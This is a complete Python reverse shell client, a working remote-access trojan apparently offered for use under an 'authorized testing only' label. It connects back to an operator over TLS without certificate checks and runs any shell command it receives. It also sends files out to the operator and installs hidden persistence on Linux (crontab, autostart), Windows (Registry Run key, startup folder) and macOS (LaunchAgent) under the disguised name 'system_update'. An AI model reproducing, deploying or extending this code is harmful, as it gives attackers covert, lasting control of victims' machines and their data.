#!/usr/bin/env python3
"""
Advanced Reverse Shell Client
Features: SSL/TLS, Password Auth, File Transfer, Persistence, Error Handling
For authorized security testing only.
"""

import socket
import ssl
import subprocess
import os
import sys
import time
import hashlib
import hmac
import base64
import platform
import getpass

# ==================== CONFIGURATION ====================
# Must match the listener's PASSWORD_HASH
PASSWORD_HASH = hashlib.sha256(b"changeme123").hexdigest()

# Reconnect settings
RECONNECT_DELAY = 10
MAX_RECONNECT_DELAY = 300
BUFFER_SIZE = 65536

# Persistence settings
PERSIST_NAME = "system_update"  # disguised name
# =======================================================


def recv_exact(sock, n):
    """Receive exactly n bytes"""
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data


def recv_message(sock):
    """Receive length-prefixed message"""
    length = int.from_bytes(recv_exact(sock, 4), "big")
    if length == 0:
        return b""
    return recv_exact(sock, length)


def send_message(sock, data):
    """Send length-prefixed message"""
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(len(data).to_bytes(4, "big") + data)


def get_system_info():
    """Gather target system information"""
    try:
        info = {
            "Hostname": socket.gethostname(),
            "User": getpass.getuser(),
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Architecture": platform.machine(),
            "Python": platform.python_version(),
            "CWD": os.getcwd(),
        }
        return "\n".join(f"  {k}: {v}" for k, v in info.items()) + "\n"
    except Exception as e:
        return f"Error gathering info: {e}\n"


def authenticate(sock):
    """Handle password authentication"""
    try:
        challenge = recv_message(sock).decode()
        response = hmac.new(
            PASSWORD_HASH.encode(), challenge.encode(), hashlib.sha256
        ).hexdigest()
        send_message(sock, response)

        result = recv_message(sock).decode()
        return result == "AUTH_OK"
    except Exception:
        return False


def handle_file_get(sock, remote_path):
    """Send file to listener"""
    try:
        if not os.path.exists(remote_path):
            send_message(sock, f"ERROR: File not found: {remote_path}")
            return

        with open(remote_path, "rb") as f:
            data = f.read()

        send_message(sock, "OK")
        send_message(sock, str(len(data)))

        # Send in chunks
        chunk_size = 32768
        for i in range(0, len(data), chunk_size):
            send_message(sock, data[i:i + chunk_size])

    except Exception as e:
        try:
            send_message(sock, f"ERROR: {e}")
        except Exception:
            pass


def handle_file_put(sock, remote_path):
    """Receive file from listener"""
    try:
        size = int(recv_message(sock).decode())
        data = b""
        while len(data) < size:
            data += recv_message(sock)

        os.makedirs(os.path.dirname(os.path.abspath(remote_path)), exist_ok=True)
        with open(remote_path, "wb") as f:
            f.write(data)

        send_message(sock, f"Uploaded {remote_path} ({size} bytes)")
    except Exception as e:
        try:
            send_message(sock, f"Upload failed: {e}")
        except Exception:
            pass


def install_persistence():
    """Install persistence mechanism based on OS"""
    system = platform.system()
    script_path = os.path.abspath(__file__)

    try:
        if system == "Linux":
            # Add to crontab (runs every 5 minutes)
            cron_line = f"*/5 * * * * /usr/bin/python3 {script_path} {{host}} {{port}} >/dev/null 2>&1\n"
            cron_file = f"/tmp/.{PERSIST_NAME}"

            with open(cron_file, "w") as f:
                f.write(cron_line)

            # Add to user crontab
            os.system(f"(crontab -l 2>/dev/null; cat {cron_file}) | crontab -")

            # Also create autostart entry
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_file = os.path.join(autostart_dir, f"{PERSIST_NAME}.desktop")
            with open(desktop_file, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Update
Exec=/usr/bin/python3 {script_path} {{host}} {{port}}
Hidden=true
X-GNOME-Autostart-enabled=true
""")

            return f"[+] Persistence installed (crontab + autostart)\n    Script: {script_path}\n    Note: Re-run with real host/port for cron."

        elif system == "Windows":
            # Add to Registry Run key
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key, PERSIST_NAME, 0, winreg.REG_SZ,
                f'pythonw.exe "{script_path}" {{host}} {{port}}'
            )
            winreg.CloseKey(key)

            # Also copy to startup folder
            startup = os.path.join(
                os.environ["APPDATA"],
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            if os.path.exists(startup):
                import shutil
                dest = os.path.join(startup, f"{PERSIST_NAME}.pyw")
                shutil.copy(script_path, dest)

            return f"[+] Persistence installed (Registry Run + Startup)\n    Script: {script_path}"

        elif system == "Darwin":  # macOS
            plist_dir = os.path.expanduser("~/Library/LaunchAgents")
            os.makedirs(plist_dir, exist_ok=True)
            plist_file = os.path.join(plist_dir, f"com.{PERSIST_NAME}.plist")

            with open(plist_file, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.{PERSIST_NAME}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
        <string>{{host}}</string>
        <string>{{port}}</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>""")

            os.system(f"launchctl load {plist_file} 2>/dev/null")
            return f"[+] Persistence installed (LaunchAgent)\n    Plist: {plist_file}"

        return f"[-] Unsupported OS: {system}"

    except Exception as e:
        return f"[-] Persistence failed: {e}"


def remove_persistence():
    """Remove persistence mechanism"""
    system = platform.system()
    removed = []

    try:
        if system == "Linux":
            os.system("crontab -l 2>/dev/null | grep -v 'system_update' | crontab -")
            removed.append("crontab entry")

            autostart = os.path.expanduser(f"~/.config/autostart/{PERSIST_NAME}.desktop")
            if os.path.exists(autostart):
                os.remove(autostart)
                removed.append("autostart file")

        elif system == "Windows":
            import winreg
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.DeleteValue(key, PERSIST_NAME)
                winreg.CloseKey(key)
                removed.append("registry key")
            except FileNotFoundError:
                pass

        elif system == "Darwin":
            plist = os.path.expanduser(f"~/Library/LaunchAgents/com.{PERSIST_NAME}.plist")
            if os.path.exists(plist):
                os.system(f"launchctl unload {plist} 2>/dev/null")
                os.remove(plist)
                removed.append("launchagent")

        return f"[+] Removed: {', '.join(removed) if removed else 'nothing found'}"
    except Exception as e:
        return f"[-] Remove failed: {e}"


def execute_command(cmd):
    """Execute shell command and return output"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=60
        )
        output = result.stdout + result.stderr
        if not output:
            output = b"[+] Command executed (no output)\n"
        return output.decode(errors="ignore").encode()
    except subprocess.TimeoutExpired:
        return b"[-] Command timed out (60s)\n"
    except Exception as e:
        return f"[-] Execution error: {e}\n".encode()


def main_loop(host, port):
    """Main connection loop with auto-reconnect"""
    delay = RECONNECT_DELAY

    while True:
        sock = None
        try:
            # Create raw socket
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(30)
            raw_sock.connect((host, port))

            # Wrap with SSL (no cert verification for self-signed)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.minimum_version = ssl.TLSVersion.TLSv1_2

            sock = context.wrap_socket(raw_sock, server_hostname=host)
            sock.settimeout(None)
            delay = RECONNECT_DELAY  # reset backoff

            # Authenticate
            if not authenticate(sock):
                sock.close()
                time.sleep(delay)
                continue

            # Main command loop
            while True:
                try:
                    cmd = recv_message(sock).decode(errors="ignore").strip()

                    if not cmd or cmd.lower() == "quit":
                        raise ConnectionError("Server requested disconnect")

                    # Special commands
                    if cmd == "__SYSINFO__":
                        send_message(sock, get_system_info())
                        continue

                    if cmd == "__PERSIST__":
                        send_message(sock, install_persistence())
                        continue

                    if cmd == "__UNPERSIST__":
                        send_message(sock, remove_persistence())
                        continue

                    if cmd.startswith("__FILE_GET__ "):
                        path = cmd[len("__FILE_GET__ "):].strip()
                        handle_file_get(sock, path)
                        continue

                    if cmd.startswith("__FILE_PUT__ "):
                        path = cmd[len("__FILE_PUT__ "):].strip()
                        handle_file_put(sock, path)
                        continue

                    # Regular shell command
                    output = execute_command(cmd)
                    send_message(sock, output)

                except (ConnectionError, socket.error, ssl.SSLError):
                    raise

        except (ConnectionRefusedError, socket.timeout, ssl.SSLError, OSError):
            # FIXED: ssl.SSLError folded in — it's a subclass of OSError anyway,
            # so a separate except block was unreachable.
            pass  # Silent retry
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

        # Exponential backoff
        time.sleep(delay)
        delay = min(delay * 2, MAX_RECONNECT_DELAY)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 client.py <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    main_loop(host, port)